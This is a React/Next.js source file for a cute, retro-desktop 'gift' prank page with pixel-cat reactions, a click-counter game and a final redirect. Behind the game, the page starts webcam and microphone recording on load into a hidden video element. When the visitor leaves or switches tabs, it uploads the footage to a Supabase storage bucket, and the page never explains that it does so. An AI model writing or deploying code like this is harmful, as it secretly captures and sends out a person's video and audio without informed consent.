"use client";

import { AnimatePresence, motion } from "framer-motion";
import { FaceLandmarker, FilesetResolver } from "@mediapipe/tasks-vision";
import { useCallback, useEffect, useRef, useState } from "react";
import { supabase } from "../lib/supabase";

type Reaction = {
  src: string;
  text: string;
};

const reactions: Reaction[] = [
  { src: "/gifs/01_confused_left.png", text: "hmm..." },
  { src: "/gifs/02_side_look_right.png", text: "why are u looking over there 👀" },
  { src: "/gifs/03_blink_eyes_closed.png", text: "..." },
  { src: "/gifs/04_looking_at_screen.png", text: "oh. u saw that." },
  { src: "/gifs/05_looking_away.png", text: "nope. definitely nothing here." },
  { src: "/gifs/06_random_movement.png", text: "WHY ARE U MOVING LIKE THAT 😭" },
  { src: "/gifs/07_angry_clicking.png", text: "stop clicking everything 😭" },
  { src: "/gifs/08_happy_reveal_near.png", text: "okay okay..." },
  { src: "/gifs/09_celebration_final.png", text: "okayyy… U win 😭" },
];

const messages = [
  "Hmm...",
  "U weren't supposed to find this yet 👀",
  "Nope. Not here.",
  "why are u still clicking 😭",
  "okay wait...",
  "there is literally nothing here.",
  "fine. maybe one tiny secret.",
  "okayyy… U win 😭",
];

function detectDirection(landmarks: any[]) {
  const leftEye = landmarks[33];
  const rightEye = landmarks[263];
  const nose = landmarks[1];

  if (!leftEye || !rightEye || !nose) return "unknown";

  const eyeCenter = (leftEye.x + rightEye.x) / 2;
  const offset = nose.x - eyeCenter;

  const leftOpen = Math.abs(
    (landmarks[159]?.y ?? 0) - (landmarks[145]?.y ?? 0)
  );

  const rightOpen = Math.abs(
    (landmarks[386]?.y ?? 0) - (landmarks[374]?.y ?? 0)
  );

  if (leftOpen < 0.012 && rightOpen < 0.012) return "blink";
  if (offset < -0.035) return "left";
  if (offset > 0.035) return "right";

  return "center";
}

export default function Home() {
  const videoRef = useRef<HTMLVideoElement>(null);
  const streamRef = useRef<MediaStream | null>(null);
  const recorderRef = useRef<MediaRecorder | null>(null);
  const chunksRef = useRef<Blob[]>([]);
  const landmarkerRef = useRef<FaceLandmarker | null>(null);
  const lastVideoTimeRef = useRef(-1);
  const faceTimerRef = useRef<number | null>(null);
  const uploadStartedRef = useRef(false);

  const [cameraState, setCameraState] = useState<
    "starting" | "recording" | "denied" | "error"
  >("starting");

  const [reactionIndex, setReactionIndex] = useState(0);
  const [messageIndex, setMessageIndex] = useState(0);
  const [clicks, setClicks] = useState(0);
  const [showReveal, setShowReveal] = useState(false);
  const [saving, setSaving] = useState(false);
  const [uploadStatus, setUploadStatus] = useState("");

  const uploadRecording = useCallback(async (blob: Blob) => {
    if (uploadStartedRef.current) return;

    uploadStartedRef.current = true;
    setSaving(true);
    setUploadStatus("uploading...");

    try {
      const fileName = `recording-${Date.now()}-${crypto.randomUUID()}.webm`;

      const { error } = await supabase.storage
        .from("recordings")
        .upload(fileName, blob, {
          contentType: "video/webm",
          upsert: false,
        });

      if (error) {
        console.error("Supabase upload error:", error);
        setUploadStatus("upload failed");
        uploadStartedRef.current = false;
        return;
      }

      setUploadStatus("saved privately");
    } catch (error) {
      console.error("Recording upload error:", error);
      setUploadStatus("upload failed");
      uploadStartedRef.current = false;
    } finally {
      setSaving(false);
    }
  }, []);

  const stopAndSaveRecording = useCallback(() => {
    const recorder = recorderRef.current;

    if (!recorder || recorder.state === "inactive") return;

    recorder.stop();
  }, []);

  const startCamera = useCallback(async () => {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({
        video: {
          facingMode: "user",
          width: { ideal: 1280 },
          height: { ideal: 720 },
        },
        audio: true,
      });

      streamRef.current = stream;

      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        await videoRef.current.play();
      }

      let mimeType = "video/webm";

      if (
        MediaRecorder.isTypeSupported(
          "video/webm;codecs=vp9,opus"
        )
      ) {
        mimeType = "video/webm;codecs=vp9,opus";
      }

      const recorder = new MediaRecorder(stream, {
        mimeType,
      });

      chunksRef.current = [];
      uploadStartedRef.current = false;

      recorder.ondataavailable = (event) => {
        if (event.data.size > 0) {
          chunksRef.current.push(event.data);
        }
      };

      recorder.onstop = async () => {
        const blob = new Blob(chunksRef.current, {
          type: mimeType,
        });

        await uploadRecording(blob);

        stream.getTracks().forEach((track) => track.stop());
      };

      recorderRef.current = recorder;

      recorder.start(1000);

      setCameraState("recording");
    } catch (error) {
      console.error("Camera error:", error);
      setCameraState("denied");
    }
  }, [uploadRecording]);

  const initFaceTracking = useCallback(async () => {
    try {
      const vision = await FilesetResolver.forVisionTasks(
        "https://cdn.jsdelivr.net/npm/@mediapipe/tasks-vision@0.10.14/wasm"
      );

      const landmarker = await FaceLandmarker.createFromOptions(
        vision,
        {
          baseOptions: {
            modelAssetPath:
              "https://storage.googleapis.com/mediapipe-models/face_landmarker/face_landmarker/float16/1/face_landmarker.task",
          },
          runningMode: "VIDEO",
          numFaces: 1,
          minFaceDetectionConfidence: 0.5,
          minFacePresenceConfidence: 0.5,
          minTrackingConfidence: 0.5,
        }
      );

      landmarkerRef.current = landmarker;
    } catch (error) {
      console.error("Face tracking could not start:", error);
    }
  }, []);

  useEffect(() => {
    startCamera();
    initFaceTracking();

    return () => {
      if (faceTimerRef.current) {
        cancelAnimationFrame(faceTimerRef.current);
      }

      streamRef.current?.getTracks().forEach((track) => {
        track.stop();
      });

      landmarkerRef.current?.close();
    };
  }, [startCamera, initFaceTracking]);

  useEffect(() => {
    const trackFace = () => {
      const video = videoRef.current;
      const landmarker = landmarkerRef.current;

      if (
        video &&
        landmarker &&
        video.readyState >= 2 &&
        video.currentTime !== lastVideoTimeRef.current
      ) {
        lastVideoTimeRef.current = video.currentTime;

        try {
          const result = landmarker.detectForVideo(
            video,
            performance.now()
          );

          if (result.faceLandmarks?.[0]) {
            const direction = detectDirection(
              result.faceLandmarks[0]
            );

            const reactionMap: Record<string, number> = {
              left: 0,
              right: 1,
              blink: 2,
              center: 3,
            };

            if (direction in reactionMap) {
              setReactionIndex(reactionMap[direction]);
            } else if (Math.random() < 0.025) {
              setReactionIndex(5);
            }
          }
        } catch {
          // Ignore occasional tracking errors.
        }
      }

      faceTimerRef.current =
        requestAnimationFrame(trackFace);
    };

    faceTimerRef.current =
      requestAnimationFrame(trackFace);

    return () => {
      if (faceTimerRef.current) {
        cancelAnimationFrame(faceTimerRef.current);
      }
    };
  }, []);

  useEffect(() => {
    const handlePageExit = () => {
      stopAndSaveRecording();
    };

    document.addEventListener(
      "visibilitychange",
      handlePageExit
    );

    window.addEventListener(
      "pagehide",
      handlePageExit
    );

    return () => {
      document.removeEventListener(
        "visibilitychange",
        handlePageExit
      );

      window.removeEventListener(
        "pagehide",
        handlePageExit
      );
    };
  }, [stopAndSaveRecording]);

  function tease() {
    setClicks((value) => {
      const next = value + 1;

      setMessageIndex(
        Math.min(next, messages.length - 1)
      );

      if (next >= 7) {
        setReactionIndex(7);
      } else {
        setReactionIndex(
          Math.min(next, 6)
        );
      }

      return next;
    });
  }

  function openGift() {
    setShowReveal(true);

    window.setTimeout(() => {
      window.location.href =
        "https://don-t-open-tan.vercel.app";
    }, 1100);
  }

  const progress = Math.min(
    (clicks / 7) * 100,
    100
  );

  return (
    <main className="app">
      <div className="desktop-dots" />

      <div className="desktop">
        <motion.div
          className="main-window"
          initial={{
            opacity: 0,
            scale: 0.96,
            y: 15,
          }}
          animate={{
            opacity: 1,
            scale: 1,
            y: 0,
          }}
          transition={{
            duration: 0.55,
          }}
        >
          <div className="titlebar">
            <div className="titlebar-left">
              <div className="window-icon">🎀</div>

              <div className="window-title">
                MADE JUST FOR U
              </div>
            </div>

            <div className="status">
              {cameraState === "recording" && (
                <>
                  <span className="rec-dot" />
                  REC
                </>
              )}
            </div>

            <div className="window-controls">
              <div className="window-control">_</div>
              <div className="window-control">□</div>
              <div className="window-control">×</div>
            </div>
          </div>

          <div className="content">

            {/* TOP DESKTOP AREA */}

            <div className="desktop-widgets">

              <div className="desktop-icon">
                <div className="pixel-icon">📁</div>
                <span>Files</span>
              </div>

              <div className="desktop-icon">
                <div className="pixel-icon">💾</div>
                <span>Save</span>
              </div>

              <div className="desktop-icon">
                <div className="pixel-icon">📧</div>
                <span>Mail</span>
              </div>

              <div className="desktop-icon">
                <div className="pixel-icon">🗑</div>
                <span>Trash</span>
              </div>

              <div className="mini-window files-window">
                <div className="mini-titlebar">
                  📁 MY STUFF
                </div>

                <div className="mini-body file-list">
                  <div>▣ definitely_not_a_secret.txt</div>
                  <div>▣ cat.exe</div>
                  <div>▣ birthday????</div>
                  <div>▣ do_not_open.zip</div>
                </div>
              </div>

              <div className="mini-window status-window">
                <div className="mini-titlebar">
                  SYSTEM STATUS
                </div>

                <div className="mini-body system-status">
                  <div>
                    mood:
                    <span>suspicious</span>
                  </div>

                  <div>
                    cat:
                    <span>watching</span>
                  </div>

                  <div>
                    secrets:
                    <span>99%</span>
                  </div>

                  <div>
                    birthday:
                    <span>█████░</span>
                  </div>
                </div>
              </div>

              <div className="sticky-note">
                <div className="note-pin">•</div>

                <strong>NOTE TO SELF:</strong>

                <p>
                  she will click
                  everything.
                </p>
              </div>

              <div className="fake-clock">
                <div>ONLINE ●</div>
                <strong>11:48 PM</strong>
              </div>

            </div>

            {/* MAIN INTERACTIVE AREA */}

            <div className="hero">

              <div className="hidden-camera">
                <video
                  ref={videoRef}
                  muted
                  playsInline
                />
              </div>

              <section className="sub-window reaction-window">
                <div className="sub-titlebar">
                  CHOOSE A CAT???
                </div>

                <div className="reaction-stage">
                  <AnimatePresence mode="wait">
                    <motion.img
                      key={reactionIndex}
                      src={
                        reactions[reactionIndex].src
                      }
                      alt="pixel cat reaction"
                      className="cat-image"
                      initial={{
                        opacity: 0,
                        scale: 0.92,
                      }}
                      animate={{
                        opacity: 1,
                        scale: 1,
                      }}
                      exit={{
                        opacity: 0,
                        scale: 1.04,
                      }}
                      transition={{
                        duration: 0.2,
                      }}
                    />
                  </AnimatePresence>
                </div>

                <motion.div
                  className="message"
                  key={messageIndex}
                  initial={{
                    opacity: 0,
                    y: 4,
                  }}
                  animate={{
                    opacity: 1,
                    y: 0,
                  }}
                >
                  {messages[messageIndex]}
                </motion.div>
              </section>

            </div>

            {/* BUTTONS */}

            <div className="controls">

              <motion.button
                className="retro-button danger"
                whileTap={{
                  scale: 0.95,
                }}
                onClick={tease}
              >
                DON'T CLICK
              </motion.button>

              {clicks >= 3 &&
                clicks < 7 && (
                  <motion.button
                    className="retro-button"
                    initial={{
                      opacity: 0,
                      scale: 0.8,
                    }}
                    animate={{
                      opacity: 1,
                      scale: 1,
                    }}
                    onClick={tease}
                  >
                    definitely not this one
                  </motion.button>
                )}

              {clicks >= 7 && (
                <motion.button
                  className="retro-button"
                  initial={{
                    opacity: 0,
                    y: 8,
                  }}
                  animate={{
                    opacity: 1,
                    y: 0,
                  }}
                  onClick={openGift}
                >
                  🎁 OPEN THIS
                </motion.button>
              )}

            </div>

            {/* SECRET FILE */}

            <div className="locked">

              <h2>
                🔒 SECRET FILE
              </h2>

              <p>
                {clicks < 2
                  ? "ACCESS DENIED."
                  : clicks < 5
                    ? "why are u trying so hard 😭"
                    : clicks < 7
                      ? "okay fine... almost."
                      : "ACCESS GRANTED (?)"}
              </p>

            </div>

            <div
              className="progress"
              aria-label="prank progress"
            >
              <div
                style={{
                  width: `${progress}%`,
                }}
              />
            </div>

            <div className="hint">
              {clicks < 7
                ? `something is definitely hiding here... ${clicks}/7`
                : "uh oh. u actually found it."}
            </div>

            {saving && (
              <div className="hint">
                uploading recording...
              </div>
            )}

            {!saving && uploadStatus && (
              <div className="hint">
                {uploadStatus}
              </div>
            )}

          </div>
        </motion.div>
      </div>

      {/* FINAL TRANSITION */}

      <AnimatePresence>
        {showReveal && (
          <motion.div
            className="reveal-overlay"
            initial={{
              opacity: 0,
            }}
            animate={{
              opacity: 1,
            }}
            exit={{
              opacity: 0,
            }}
          >
            <motion.div
              className="reveal-card"
              initial={{
                scale: 0.85,
                opacity: 0,
              }}
              animate={{
                scale: 1,
                opacity: 1,
              }}
              transition={{
                duration: 0.45,
              }}
            >
              <div className="sub-titlebar">
                ONE LAST THING 🎀
              </div>

              <div className="reveal-body">

                <motion.h1
                  initial={{
                    y: 12,
                    opacity: 0,
                  }}
                  animate={{
                    y: 0,
                    opacity: 1,
                  }}
                >
                  okayyy… U win 😭
                </motion.h1>

                <motion.p
                  initial={{
                    y: 12,
                    opacity: 0,
                  }}
                  animate={{
                    y: 0,
                    opacity: 1,
                  }}
                  transition={{
                    delay: 0.12,
                  }}
                >
                  one last thing 🎀
                </motion.p>

                <motion.div
                  initial={{
                    scaleX: 0,
                  }}
                  animate={{
                    scaleX: 1,
                  }}
                  transition={{
                    duration: 0.75,
                  }}
                  className="progress"
                >
                  <div
                    style={{
                      width: "100%",
                    }}
                  />
                </motion.div>

              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

    </main>
  );
}